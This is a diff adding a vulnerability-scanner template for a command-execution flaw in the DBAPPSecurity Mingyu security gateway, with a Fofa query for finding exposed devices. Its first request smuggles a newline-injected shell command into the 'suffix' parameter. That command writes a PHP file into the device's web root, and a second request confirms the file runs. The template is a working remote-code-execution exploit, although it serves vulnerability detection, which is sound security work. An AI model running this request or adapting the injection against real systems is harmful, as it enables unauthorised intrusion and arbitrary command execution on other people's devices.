@@ -1,0 +1,26 @@
+id: dbappsecurity-aaa-portal-auth-config-reset-suffix-rce
+
+info:
+  name: 明御安全网关命令执行
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    Fofa: title="明御安全网关"
+  tags: dbappsecurity,rce
+  created: 2023/12/08
+
+set:
+  randstr: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webui/?g=aaa_portal_auth_local_submit&suffix=%0aecho%20%27%3C%3Fphp%20echo%20%22test%20-%20Open%20source%20project%20%28github.com%2Ftest%2Ftest%29%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F{{randstr}}.php&bkg_flag=0
+    expression: response.status == 200 
+  r1:
+    request:
+      method: GET
+      path: /{{randstr}}.php
+    expression: response.status == 200 && response.body.bcontains(b'(github.com/test/test)')
+expression: r0() && r1()
